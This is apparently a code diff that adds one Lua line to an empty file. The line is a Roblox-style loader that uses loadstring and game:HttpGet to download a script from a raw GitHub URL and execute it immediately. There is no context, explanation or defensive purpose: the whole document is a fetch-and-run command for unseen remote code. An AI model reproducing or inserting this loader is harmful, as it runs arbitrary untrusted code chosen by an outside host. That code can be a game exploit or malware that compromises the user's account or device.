@@ -1,1 +1,1 @@
-
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sjsidjdnnsnsns/game/refs/heads/main/chain"))()
